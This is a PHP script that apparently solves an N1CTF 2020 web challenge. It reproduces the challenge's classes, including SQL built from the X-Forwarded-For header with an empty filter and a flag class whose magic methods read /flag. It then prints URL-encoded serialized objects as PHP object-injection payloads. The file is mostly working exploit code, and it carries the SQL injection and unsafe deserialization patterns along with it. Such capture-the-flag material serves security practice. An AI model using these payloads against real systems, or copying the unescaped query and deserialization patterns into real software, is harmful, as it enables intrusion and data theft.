<?php

class ip {
    public $ip;
    public function waf($info){
    }
    public function __construct($ok) {
        if(isset($_SERVER['HTTP_X_FORWARDED_FOR'])){
            $this->ip = $this->waf($_SERVER['HTTP_X_FORWARDED_FOR']);
        }else{
            $this->ip =$ok;//$_SERVER["REMOTE_ADDR"];
        }
    }
    public function __toString(){
        //$con=mysqli_connect("localhost","root","********","n1ctf_websign");
        //$sqlquery=
	print(sprintf("INSERT into n1ip(`ip`,`time`) VALUES ('%s','%s')",$this->waf($this->ip),time()));
	return "\n";
        if(!mysqli_query($con,$sqlquery)){
            return mysqli_error($con);
        }else{
            return "your ip looks ok!";
        }
        mysqli_close($con);
    }
}

class flag {
    public $ip;
    public $check;
    public function __construct($ip) {
        $this->ip = $ip;
    }
    public function getflag(){
    	if(md5($this->check)===md5("key****************")){
    		readfile('/flag');
    	}
        return $this->ip;
    }
    public function __wakeup(){
        if(stristr($this->ip, "n1ctf")!==False)
            $this->ip = "welcome to n1ctf2020";
        else
            $this->ip = "noip";
    }
    public function __destruct() {
        echo $this->getflag();
    }

}

$flag_ob = new flag("asdasdn1ctfasdasdxx");
$flag_ob->check = "adf0f5554ee8122354021b9f60ab8974";
echo "with check: ";
print(urlencode(serialize($flag_ob)));
echo "\n";

$flag_ob2 = new flag("n1ctf");
echo "without check: ";
print(urlencode(serialize($flag_ob2)));
echo "\n";


$ip_ob = new ip("test_data");
//print(($ip_ob));

?>
